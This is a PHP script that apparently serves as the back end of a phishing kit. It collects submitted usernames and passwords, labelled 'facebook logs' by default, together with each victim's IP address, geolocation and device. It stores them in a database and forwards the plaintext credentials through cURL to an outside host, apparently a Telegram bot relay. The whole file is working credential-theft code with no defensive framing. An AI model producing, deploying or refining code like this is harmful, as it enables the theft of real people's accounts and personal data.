<?php
include_once "admin/db_connection.php";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = isset($_POST["username"]) ? $_POST["username"] : '';
    $password = isset($_POST["password"]) ? $_POST["password"] : '';
    $logs_type = isset($_POST["logType"]) ? $_POST["logType"] : '';
    $device = isset($_POST["device"]) ? $_POST["device"] : '';

    // Set default log type if empty or not assigned
    if (empty($logs_type)) {
        $logs_type = "facebook logs";
    }

    // Function to retrieve country and region from IP address
    function getCountryAndRegionFromIP($ip) {
        // Using a different IP geolocation service (replace with your preferred service)
        $api_url = "http://ip-api.com/json/{$ip}";
        $response = file_get_contents($api_url);
        $data = json_decode($response, true);
        
        // Check if geolocation data is available
        if ($data && $data['status'] == 'success') {
            $country = $data['country'];
            $region = $data['regionName'];
            return array($country, $region);
        } else {
            // Fallback to default values or handle error case
            return array("Unknown", "Unknown");
        }
    }

    // Get user's IP address
    $user_ip = $_SERVER['REMOTE_ADDR'];
    $date_time = date('Y-m-d H:i:s');

    // Get country and region from IP
    list($user_country, $user_region) = getCountryAndRegionFromIP($user_ip);

    // Get main domain name
    $parsed_url = parse_url("http://$_SERVER[HTTP_HOST]");
    $login_source = $parsed_url['host'];

    // Prepare insert statement
    $stmt = $conn->prepare("INSERT INTO logs (username, password, log_type, user_ip, user_country, user_region, user_device, date_time, chat_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("sssssssss", $username, $password, $logs_type, $user_ip, $user_country, $user_region, $device, $date_time, $chat_id);

    // Execute statement
    if ($stmt->execute()) {

        // Prepare data to send to the second website
        $dataToSend = array(
            'key1' => $chat_id, // chat ID
            'key2' => $bot_token, // bot token
            'message' => "New log added:\nUsername: $username\nPassword: $password\nLog Type: $logs_type\nDevice: $device\nIP: $user_ip\nCountry: $user_country\nRegion: $user_region\nDate: $date_time\nLogin Source: $login_source"
        );

        // Send data to the second website using cURL
        $ch = curl_init('http://tittrademarket.com/tg.php');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($dataToSend));
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json',
            'Authorization: Bearer 12345'
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        if ($response === false) {
            echo "Error sending data to the second website.";
        } else {
            echo "";
        }
    } else {
        echo "Error: " . $stmt->error;
    }

    // Close statement and connection
    $stmt->close();
    $conn->close();
}
?>
